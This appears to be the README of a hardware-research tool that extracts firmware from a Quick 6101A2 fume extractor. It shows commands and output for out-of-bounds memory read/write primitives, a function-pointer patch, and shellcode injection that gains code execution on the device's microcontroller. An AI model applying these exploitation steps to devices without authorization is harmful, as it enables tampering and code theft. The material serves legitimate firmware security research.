# qu6101a2-firmware-extractor

Tooling for extracting firmware from the Quick 6101A2 fume extractor.

This project implements the out-of-bounds read/write primitives described in my blog post. Those primitives can be used to obtain code execution on the microcontroller, which enables firmware extraction. For more details, please refer to the blog post.

> [!CAUTION]
> Use this tool at your own risk.

## Register map base address

The out-of-bounds offset is derived from the register-map base address. By default, the tool uses the value observed in the `6612-MAIN V1.5.1` firmware. If your board runs a different firmware version, you may need to provide a different base address.

The tool can also find the base address heuristically by scanning register indices until it reaches RAM bounds and triggers an access fault.

```bash
$  qu-tool.py --port /dev/ttyUSB0 find-base
[*] Peaking RAM: 0x076a...
[+] Reached the end of RAM
[+] Waiting the device to restart: 0
[+] Turn off the motor
[+] Register map base: 0x2000412c
[+] Write ptr address: 0x200042c4
```

Use `--base-addr` to provide a custom register map base address.

## Read memory

```bash
$ qu-tool.py --port /dev/ttyUSB0 read --addr 0x20004390 --size 0x40
20004390: 72 B6 0A 4A 4F F0 00 60 4F F4 00 31 08 4C 4A F6  r..JO..`O..1.LJ.
200043A0: AA 25 49 B1 13 68 13 F0 80 0F FB D0 10 F8 01 3B  .%I..h.........;
200043B0: 53 60 25 60 01 39 F4 E7 25 60 FD E7 00 44 00 40  S`%`.9..%`...D.@
200043C0: 00 30 00 40 00 00 00 00 00 00 00 00 00 00 00 00  .0.@............
```

## Write memory

```bash
# Use `--data` to pass hex-encoded bytes
$ qu-tool.py --port /dev/ttyUSB0 write --addr 0x200042C4 --data "91 43 00 20"
[*] Wrote 4 bytes starting at 0x200042C4

# Or use `--file` to read input from a file
$ qu-tool.py --port /dev/ttyUSB0 write --addr 0x20004390 --file payload.bin
[*] Wrote 52 bytes starting at 0x20004390
```

## Firmware extraction

The tool includes a self-contained firmware extractor. It first leaks the register map base address using the read primitive, then writes and triggers a dumper payload.

```bash
$ ./qu-tool.py --port /dev/ttyUSB0 auto-extract
[+] Dumping the content of RAM to find the settings vtable
[*] Peaking RAM: 0x076a...
[+] Reached the end of RAM
[+] Waiting the device to restart: 0
[+] Turn off the motor
[+] Register map base: 0x2000412c
[+] Write ptr address: 0x200042c4
[+] Found an empty space for the shellcode: 0x20004390
[+] Will write the shellcode at 0x20004390
    and patch write ptr at 0x200042c4. Continue? [yN]: y
[+] Writing the extraction shellcode
[+] Wrote 52 bytes starting at 0x20004390
[+] Patching the write function ptr
[+] Wrote 4 bytes starting at 0x200042c4
[+] Triggering the write func
[*] Reading: 0x20000...
[+] Done
[+] Dump stored: out.bin
[+] Turn the device off to remove the shellcode
```
